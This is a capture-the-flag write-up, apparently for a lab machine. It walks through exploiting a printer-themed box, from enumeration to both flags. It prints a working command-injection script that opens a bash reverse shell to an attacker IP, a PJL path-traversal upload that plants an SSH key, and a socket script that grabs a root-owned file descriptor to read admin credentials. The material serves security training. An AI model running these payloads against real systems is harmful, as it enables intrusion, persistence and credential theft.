Given the IP address for this machine I am asked to get the 2 flags once again

## Enumeration

First things first, I start with port enumeration with nmap
![[Pasted image 20260714152001.png]]
The scan shows 2 ports open:
- port 22 for ssh
- port 80 for http where a website is active

Opening the present website I am met with a simple webpage which seems to be some sort of Portal for a Department of Records
![[Pasted image 20260714152155.png]]

There are 3 things worth noticing:
- `Protocol Compliance Level: RFC 1179` - which hints at regulatory document which may hint us later in how to provide data to the webserver
- `Target Queue archive_intake` - probably is some code or hint or a value we will use later
- `Internal Processor` - gives us the `paperwork-archive-v1.02.zip` which from the name I suppose is an example for a service that runs behind the webserver

I downloaded the zip archive and unzip it with `unzip paperwork-archive-v1.02.zip` command and it gave me a file `server.py`

The file appears to contain a `LPD server` code which opens a socket on port 1515 and listens for incoming data
- Through all this code 2 functions tells us how the server works:
	- `run()`:
	![[Pasted image 20260714154752.png]]
	- `handle_print_job(data)`:
	![[Pasted image 20260714154842.png]]

After going through the server I suspected that this is an example of an existing service on port 1515 on the target which is not an usual port, being the reason why it was not found in the nmap scan

With a quick nmap scan on the target form port 1515 I found that truly there is a service running on port 1515 which is some sort of printer
![[Pasted image 20260714155205.png]]

Knowing that port 1515 is in fact open I go back to the server.py file to learn how can this file open me a way inside the system 

The data you have to send to the server it follows the next pattern:
- first in the `run()` function it takes a byte representing the number 2, 3 or 4
	- if you send 2 it will execute the `handle_print_job(data)` function with the remaining data
	- if you send 3 or 4 it will return a message saying that the printer is ready
- Then it decodes the next part into a string and give to a variable `queue` which has to be present in a env variable `LPD_QUEUE` (named `VALID_QUEUE`)
- If the queue is valid then it gets a chunk of data separated:
	- first part is a subcommand
	- then a size `X`
	- some `content` of size `X`
- The `content` variable gets parsed in multiple lines and if the line starts with `J` then a new variable `job_name` gets the remaining data

Now here comes the interesting part with this `job_name`
![[Pasted image 20260714161915.png]]
- As seen above the `job_name` is getting passed to the `subprocess.Popen()` function which basically opens a shell and executes an `echo` command 
- Since there is no input sanitization, as long as I respect the data format from above I can enter whatever commands with the following form: `J';<command>;'\n` and it will get executed

Remember the `Target Queue` field from the browser? I think we found where the value `archive_intake` will help

So next step is to craft a payload to connect to the socket on the open port and send the data and to wait for a response:
- VERY IMPORTANT:
	- the data needs to be in byte format
	- the value for the queue must be `archive_intake`
	- the data must be separated at some points by `\n` and space(` `)
```python
import socket

HOST = "paperwork.htb"
PORT = 1515
queue = b"archive_intake"

# The content that the server will parse for a job name.
job_content = b"J';bash -c 'bash -i >& /dev/tcp/<IP_address>/4444 0>&1';'\n"
# The server expects a size field before reading the content.
job_size = len(job_content)

with socket.create_connection((HOST, PORT)) as s:
    # Initial command: 0x02 + queue name
    s.sendall(b"\x02" + queue + b"\n")

    # Read response (queue accepted/rejected)
    response = s.recv(1024)
    print("Queue response:", response)
    if response != b"\x00":
        print("Queue was not accepted")
        exit()

    # Send the next command block
    control = f"{job_size} control\n".encode()
    s.sendall(b"\x02" + control)
    response = s.recv(1024)
    print("Control response:", response)

    # Send the job content
    s.sendall(job_content)
    response = s.recv(1024)
    print("Job response:", response)
```

By sending the following payload we can get a reverse shell on the machine, but also we have to open a local listener before running the script with `nc -lvnp 4444`

The reverse shell succeeded and we got a reverse shell as the `lp` user (usual users for printers) 
![[Pasted image 20260714163630.png]]

With a quick enumeration for users I found my next target which is the `archivist` user
![[Pasted image 20260714163929.png]]

Enumerating the open ports with `ss -tulnp` I found 3 ports open on the loopback address (`localhost`):
![[Pasted image 20260714164318.png]]
- port 323, 9100, 1337
- We have 3 potential services that could be exploited further

With these ports in mind I went to search if there are any services running and with the help of the command `ps aux | grep "9100"` I got the following:
![[Pasted image 20260714164559.png]]
- The output gave me exactly what I wanted, an script running on port 9100 and owned by the `archivist` user

Unfortunately I don't have read permission on the script but the name of the script `jetdirect.py` made me think that is a network printer and maybe I can communicate with it through the open port 

Since it is a `jetdirect` printer I can use the Printer Job Language to communicate with it so to check if it works I will send a simple `FSDIRLIST` command to the printer

Because I don't have `netcat` installed on the target I will use a little trick to send the command:
- first I bound to file descriptor `3` the port
- then I send with an `echo` command the `PJL` query
- then with help of cat I will read the output
```bash
exec 3<>/dev/tcp/127.0.0.1/9100
echo -e '@PJL FSDIRLIST NAME="/"\r' >&3
timeout 3 cat <&3
```

The output of this command shows me that I got access to the printer filesystem in which I found 2 files and one of them I believe is the actual source code of the printer `jetdirect.py`
![[Pasted image 20260714171556.png]]
- Also since I found `jetdirect.py` here I assume that the root of the printer filesystem is the `/home/archivist/printer` directory 

But now that we can get the source code let's actually get it:
- Since the code is very huge I will not show it all here, but essentially it shows how to write commands, what commands I can use but more importantly the info from below is interesting
![[Pasted image 20260714172237.png]]
- From the photo above we learn that from the usage of the script I can get the root directory of the filesystem 
- From the command above `ps aux | grep 9100` we now learn that the root directory is `/home/archivist/printer/` which made my assumption true

Now the next image is more interesting:
![[Pasted image 20260714172114.png]]
- When translating the path I give to, it does absolutely nothing against file traversal ex: `../../` so I can learn info about the whole system but I can also upload any file where the `archivist` user has permission

Learning about the previous exploitable path I can now upload ssh public key inside the `.ssh` folder and then I will be able to ssh to the `archivist` user with my private key 

First step is to generate the ssh key pair 
```bash
ssh-keygen key
```
Then I upload the key inside the `.ssh` directory with the following commands
```bash
KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... your_pubkey_here" LEN=${#KEY} 

exec 3<>/dev/tcp/127.0.0.1/9100 
echo -e "@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=$LEN\r" >&3 
sleep 0.5 
echo -n "$KEY" >&3 
timeout 3 cat <&3
```
After this we get an `OK` message and now the real test lets try to ssh

The ssh is successful and I got the user flag:
![[Pasted image 20260714174037.png]]

## Root flag

Searching through the system I found the following after I looked through the running services:
![[Pasted image 20260714175205.png]]
- There is a daemon running with the name of the box which looks suspicious

Luck is on my side and I can read the file: 
- In the file there are mentioned 3 important things:
	- when running it checks the logs at `/home/archivist/printer/logs/commands.log`
	- there is a config file which is owned and accessible only by the `root` at `/etc/paperwork/admin_pins.conf`
	- there is a socket present at `/run/paperwork/mgmt.sock` which deals with this script

The `main()` function presents 2 outcomes:
- scans the log file and checks for malicious input like `FSUPLOAD` or `FSDOWNLOAD` and if present it runs the `trigger_lockdown()` function

- If it doesn't find anything it leads us to a trap that makes us think that will give the Admin password but since I got baited by that I will not present it further

Back to the `trigger_lockdown()` function
![[Pasted image 20260714180511.png]]
- Instead of just alerting the use it hands us the actual root-opened file descriptor to the secrets file via `SCM_RIGHTS` (a Unix technique for passing open file descriptors between processes over a socket)
- Once we will have that file descriptor we can do whatever we want with the file

First we have to make sure the log contains commands like `FSUPLOAD` or `FSDOWNLOAD` but they are already there since we use `FSUPLOAD` to put the private key there so it will automatically redirect to the `trigger_lockdown()` function

Now I will create a python script to connect to the socket, grab the file descriptor and get the value of the Admin password (hopefully the root password as well)
```python
import socket, array, os 

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) sock.connect("/run/paperwork/mgmt.sock") 

fds = array.array("i") 
msg, ancdata, flags, addr = sock.recvmsg(4096, socket.CMSG_LEN(fds.itemsize * 10)) 

for cmsg_level, cmsg_type, cmsg_data in ancdata: 
	if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS: 
		fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)]) 

print("Message:", msg) 
print("fds:", list(fds)) 

# fds[0] = log_fd, fds[1] = admin_fd
admin_fd = fds[1] 
data = os.pread(admin_fd, 1024, 0) 
print("admin pass: ", data)
```

After running it it gave me the Admin password and the only thing left is to try to ssh to root with it:
![[Pasted image 20260714181747.png]]

It worked and I got the system flag
![[Pasted image 20260714181854.png]]